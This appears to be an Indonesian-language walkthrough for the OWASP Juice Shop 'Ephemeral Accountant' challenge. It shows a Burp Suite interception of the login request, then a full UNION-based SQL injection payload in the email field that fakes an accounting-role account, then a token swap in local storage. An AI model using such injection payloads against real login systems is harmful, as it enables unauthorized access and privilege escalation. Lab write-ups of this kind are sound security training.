# Ephemeral Accountant

## Resource Belajar

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

# Step by step
1. Jadi awalnya anda hanya perlu intercept burpsuite saat login dengan email dan username random
  <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/56dec77a-a627-4205-9d6f-a6b56622b80c" />

2. Kemudian anda bisa buat payload untuk bypass dengan membuat akun fiktif dengan sql injection dengan payload berikut.
```{"email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'penguasabumi@juice-sh.op' AS `username`, 'penguasabumi@juice-sh.op' AS `email`, 'sedanglelah' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--", "password": "sedanglelah"}```
<img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/733712b9-0353-4179-8907-d8fa109cdce7" />

3. Setelah itu anda tinggal merubah token pada local storage dengan token yang memiliki role accountant tadi.
   <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/f82cf5f4-5e44-40d7-8f87-d43c30c57d98" />

   <img width="1439" height="856" alt="image" src="https://github.com/user-attachments/assets/8357bcf6-474d-41a4-a394-a544c8d07ce2" />
